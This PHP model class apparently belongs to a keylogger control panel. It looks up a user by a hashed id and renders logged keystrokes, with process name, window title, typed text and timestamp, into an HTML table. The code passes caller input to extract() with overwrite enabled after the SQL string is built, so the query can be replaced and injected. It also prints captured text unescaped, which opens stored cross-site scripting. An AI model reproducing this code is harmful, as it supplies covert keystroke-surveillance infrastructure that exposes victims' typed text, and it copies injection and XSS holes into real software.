<?php

class Model_userControl extends Model
{

	/**
	 * @param $arr
	 * @return array
     */
	public function get_data($arr)
	{
		$process = '';
		$orderBy = '';
		$showWithoutText = true;
		$conversely = false;

		$sql = "SELECT * FROM keyboard WHERE userId = :userId";
		$values = array();
		//get arivable columns
		$i = 0;
		$rows = array();
		$stmt = $GLOBALS['DB']->query("SELECT `COLUMN_NAME` FROM `INFORMATION_SCHEMA`.`COLUMNS` WHERE `TABLE_SCHEMA`='".DB_NAME."' AND `TABLE_NAME`='keyboard' ");
		while($row = $stmt->fetch())
		{
			array_push($rows,$row['COLUMN_NAME']);
			$i++;
		}

		extract ($arr,EXTR_OVERWRITE);

		if(!isset($id))
		{
			return $this->return_error();
		}
		if(strlen($id) != 64)
		{
			return $this->return_error();
		}

		if(!$showWithoutText)
		{
			$sql .= " AND text IS NOT NULL";
		}

		if(strlen($process) != 0)
		{
			$sql .= " AND process = :process";
			$values['process'] = $process;
		}

		if(in_array($orderBy,$rows))
		{
			$sql .= " ORDER BY ".$orderBy;
			if($conversely)
			{
				$sql .= " DESC";
			}
		}

		$stmt = $GLOBALS['DB']->prepare("SELECT * FROM users WHERE shaId = :id ");
		$stmt->execute(array('id' => $id));
		$user = $stmt->fetch();

		$values['userId'] = $user['id'];
		$stmt = $GLOBALS['DB']->prepare($sql);
		$stmt->execute($values);
		$keyboard = $stmt->fetchAll(PDO::FETCH_ASSOC);

       	$table =  "<tr>
                <th width='15%'><div name='process' class='tableHeader'>Process</div></th>
                <th width='25%'><div name='title' class='tableHeader'>Title</div></th>
                <th width='37%'><div name='text' class='tableHeader'>Text</div></th>
                <th width='23%'><div name='eventTime' class='tableHeader'>Event time</div></th>
               </tr>";

		foreach($keyboard as $key => $row )
		{
			$table = $table."<tr>
			<td class='td-process'>".$row['process']."</td>
			<td>".$row['title']."</td>
			<td class='savedText' style='word-break:break-all;'>".$row['text']."</td>
			<td style='white-space: nowrap;'>".$row['eventTime']."</td>
		</tr>";
		}

		$result = array(
			'title' => 'User control',
			'data' => $user,
			'table' => $table,
			'error' => false,
			'id' => $id,
			);
		return $result;
	}

	private function return_error ()
	{
		return array(
			'title' => 'User control',
			'data' => 'Id incorrect',
			'error' => true,
		);
	}
}
